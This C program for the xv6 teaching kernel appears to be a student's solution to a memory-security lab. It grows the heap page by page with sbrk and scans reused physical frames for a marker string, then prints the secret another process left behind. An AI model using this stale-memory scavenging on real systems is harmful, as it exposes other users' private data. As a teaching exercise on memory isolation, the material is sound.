#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"


#define DATASIZE (8*4096)


int
main(int argc, char *argv[])
{
  // since the physical frame still olds the victim's page, we need to grow our heap and allocate pages until we find the stale frame. 
  // this means using sbrk and tracking the pointer. 
  // kmem->freelist tracks the available frames, and we need to exhaust these frames.
  // Your code here.
  // printf("%p", data); - LOL no ASLR

  char *p; // track which address we are at.
  while(1 == 1) {
    p = sbrk(PGSIZE);
    if (p == ((char *)-1)) {
      exit(1);
    }                             // else will page fault 
    for (int i = 0; i < PGSIZE - 15; i = i + sizeof(char)) { // we need at least those many bytes to find the data in this page.
       if (strcmp(p+i, "This may help.") == 0) {
        printf("%s\n", (p + i + 16));
       }

    }
  }
  exit(0);
}
